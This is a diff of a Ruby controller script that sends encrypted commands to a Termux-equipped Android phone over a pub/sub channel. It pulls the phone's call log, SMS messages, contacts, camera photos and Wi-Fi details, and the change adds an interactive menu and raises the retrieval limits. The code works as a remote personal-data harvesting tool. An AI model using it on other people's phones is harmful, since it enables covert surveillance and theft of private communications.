@@ -6,6 +6,15 @@ require_relative 're'
 params = {
   :id => SecureRandom.hex(2)
 }
+audio_info = {}
+battery_status = {}
+call_log = []
+camera_info = {}
+contacts = []
+sms_list = []
+device_info = {}
+wifi_connection_info = {}
+wifi_scan_info = {}
 
 re = Re.new
 
@@ -54,18 +63,18 @@ re.add_topics({
 })
 
 re.add_packets({
-  :open             => { :id => params[:id] },
-  :close            => { :id => params[:id] },
-  :audio_info       => { :id => params[:id] },
-  :call_log         => { :id => params[:id], :limit => 10, :offset => 0 },
-  :battery_status   => { :id => params[:id] },
-  :camera_info      => { :id => params[:id] },
-  :camera_photo     => { :id => params[:id], :camera_id => 1, :output_file => 'capture.jpg' },
-  :contact_list     => { :id => params[:id] },
-  :sms_list         => { :id => params[:id], :limit => 10, :offset => 0, :type => 'all' },
-  :device_info      => { :id => params[:id] },
-  :wifi_connection_info  => { :id => params[:id] },
-  :wifi_scan_info        => { :id => params[:id] }
+  :open                   => { :id => params[:id] },
+  :close                  => { :id => params[:id] },
+  :audio_info             => { :id => params[:id] },
+  :call_log               => { :id => params[:id], :limit => 10969, :offset => 0 },
+  :battery_status         => { :id => params[:id] },
+  :camera_info            => { :id => params[:id] },
+  :camera_photo           => { :id => params[:id], :camera_id => 1, :output_file => 'capture.jpg' },
+  :contact_list           => { :id => params[:id] },
+  :sms_list               => { :id => params[:id], :limit => 10969, :offset => 0, :type => 'all' },
+  :device_info            => { :id => params[:id] },
+  :wifi_connection_info   => { :id => params[:id] },
+  :wifi_scan_info         => { :id => params[:id] }
 })
 
 re.add_topic_callback(:bushi) do |message|
@@ -93,45 +102,66 @@ re.add_topic_callback(:termux_evt_open) do |message|
   packet = re.decryse(message.payload)
   puts packet.to_yaml
 
-  packet = re.packets(:audio_info)
-  packet = re.seen(packet)
-  re.publish(:termux_cmd_audio_info, packet, false, 2)
+  re.internals[:ui].on :render_termux do |prompt|
+    case prompt
+    when 'l'
+      packet = re.packets(:call_log)
+      packet = re.seen(packet)
+      re.publish(:termux_cmd_call_log, packet, false, 2)
+    when 's'
+      packet = re.packets(:sms_list)
+      packet = re.seen(packet)
+      re.publish(:termux_cmd_sms_list, packet, false, 2)
+    when 'c'
+      packet = re.packets(:contact_list)
+      packet = re.seen(packet)
+      re.publish(:termux_cmd_contact_list, packet, false, 2)
+    when 'm'
+      puts 'camera'
+    end
+  end
 
-  packet = re.packets(:battery_status)
-  packet = re.seen(packet)
-  re.publish(:termux_cmd_battery_status, packet, false, 2)
+  prompt = re.internals[:ui].render_termux_ui()
 
-  packet = re.packets(:call_log)
-  packet = re.seen(packet)
-  re.publish(:termux_cmd_call_log, packet, false, 2)
-
-  packet = re.packets(:camera_info)
-  packet = re.seen(packet)
-  re.publish(:termux_cmd_camera_info, packet, false, 2)
-
-  packet = re.packets(:camera_photo)
-  packet = re.seen(packet)
-  re.publish(:termux_cmd_camera_photo, packet, false, 2)
-
-  packet = re.packets(:contact_list)
-  packet = re.seen(packet)
-  re.publish(:termux_cmd_contact_list, packet, false, 2)
-
-  packet = re.packets(:sms_list)
-  packet = re.seen(packet)
-  re.publish(:termux_cmd_sms_list, packet, false, 2)
-
-  packet = re.packets(:device_info)
-  packet = re.seen(packet)
-  re.publish(:termux_cmd_device_info, packet, false, 2)
-
-  packet = re.packets(:wifi_connection_info)
-  packet = re.seen(packet)
-  re.publish(:termux_cmd_wifi_connection_info, packet, false, 2)
-
-  packet = re.packets(:wifi_scan_info)
-  packet = re.seen(packet)
-  re.publish(:termux_cmd_wifi_scan_info, packet, false, 2)
+  # packet = re.packets(:audio_info)
+  # packet = re.seen(packet)
+  # re.publish(:termux_cmd_audio_info, packet, false, 2)
+  #
+  # packet = re.packets(:battery_status)
+  # packet = re.seen(packet)
+  # re.publish(:termux_cmd_battery_status, packet, false, 2)
+  #
+  # packet = re.packets(:call_log)
+  # packet = re.seen(packet)
+  # re.publish(:termux_cmd_call_log, packet, false, 2)
+  #
+  # packet = re.packets(:camera_info)
+  # packet = re.seen(packet)
+  # re.publish(:termux_cmd_camera_info, packet, false, 2)
+  #
+  # packet = re.packets(:camera_photo)
+  # packet = re.seen(packet)
+  # re.publish(:termux_cmd_camera_photo, packet, false, 2)
+  #
+  # packet = re.packets(:contact_list)
+  # packet = re.seen(packet)
+  # re.publish(:termux_cmd_contact_list, packet, false, 2)
+  #
+  # packet = re.packets(:sms_list)
+  # packet = re.seen(packet)
+  # re.publish(:termux_cmd_sms_list, packet, false, 2)
+  #
+  # packet = re.packets(:device_info)
+  # packet = re.seen(packet)
+  # re.publish(:termux_cmd_device_info, packet, false, 2)
+  #
+  # packet = re.packets(:wifi_connection_info)
+  # packet = re.seen(packet)
+  # re.publish(:termux_cmd_wifi_connection_info, packet, false, 2)
+  #
+  # packet = re.packets(:wifi_scan_info)
+  # packet = re.seen(packet)
+  # re.publish(:termux_cmd_wifi_scan_info, packet, false, 2)
 end
 
 re.add_topic_callback(:termux_evt_close) do |message|
@@ -151,7 +181,8 @@ end
 
 re.add_topic_callback(:termux_evt_call_log) do |message|
   packet = re.decryse(message.payload)
-  puts packet.data
+  prompt = re.internals[:ui].render_call_log(packet.data)
+  re.internals[:ui].render_termux_ui()
 end
 
 re.add_topic_callback(:termux_evt_camera_info) do |message|
@@ -166,12 +197,13 @@ end
 
 re.add_topic_callback(:termux_evt_contact_list) do |message|
   packet = re.decryse(message.payload)
-  puts packet.data
+  re.internals[:ui].render_contacts(packet.data)
+  re.internals[:ui].render_termux_ui()
 end
 
 re.add_topic_callback(:termux_evt_sms_list) do |message|
   packet = re.decryse(message.payload)
-  puts packet.data
+  re.internals[:ui].render_sms_list(packet.data)
 end
 
 re.add_topic_callback(:termux_evt_device_info) do |message|
